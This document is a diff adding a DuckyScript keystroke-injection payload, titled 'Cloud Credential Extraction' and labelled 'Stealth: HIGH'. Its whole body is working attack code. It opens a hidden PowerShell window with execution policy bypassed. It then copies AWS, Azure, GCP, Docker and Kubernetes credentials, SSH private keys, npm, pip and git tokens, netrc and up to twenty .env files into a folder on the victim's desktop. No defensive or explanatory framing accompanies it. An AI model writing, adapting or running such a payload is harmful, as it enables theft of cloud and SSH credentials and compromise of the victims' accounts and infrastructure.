@@ -1,0 +1,12 @@
+REM ============================================
+REM  FU PERSON | Cloud Credential Extraction
+REM  FLLC - by PERSON FU
+REM  Time: ~15 seconds | Stealth: HIGH
+REM  AWS, Azure, GCP, Docker, K8s credentials
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$d=[Environment]::GetFolderPath('Desktop')+'\cloud_creds';md $d -f|Out-Null;$h=$env:USERPROFILE;$targets=@{aws_creds=\"$h\.aws\credentials\";aws_config=\"$h\.aws\config\";azure_profile=\"$h\.azure\azureProfile.json\";azure_tokens=\"$h\.azure\accessTokens.json\";azure_msal=\"$h\.azure\msal_token_cache.json\";gcp_adc=\"$h\AppData\Roaming\gcloud\application_default_credentials.json\";gcp_creds=\"$h\AppData\Roaming\gcloud\credentials.db\";gcp_props=\"$h\AppData\Roaming\gcloud\properties\";docker_config=\"$h\.docker\config.json\";kube_config=\"$h\.kube\config\";ssh_key=\"$h\.ssh\id_rsa\";ssh_pub=\"$h\.ssh\id_rsa.pub\";ssh_known=\"$h\.ssh\known_hosts\";ssh_config=\"$h\.ssh\config\";npm_token=\"$h\.npmrc\";pip_conf=\"$h\pip\pip.ini\";git_creds=\"$h\.git-credentials\";netrc=\"$h\_netrc\"};foreach($k in $targets.Keys){$f=$targets[$k];if(Test-Path $f){cp $f \"$d\$k\" -f 2>$null}};gci $h -r -fi '.env' -ErrorAction SilentlyContinue|select -f 20|%{$n=$_.FullName -replace '[:\\\\]','_';cp $_.FullName \"$d\env_$n\" -f 2>$null};'Done'|Out-File \"$d\complete.txt\""
+ENTER
+DELAY 500
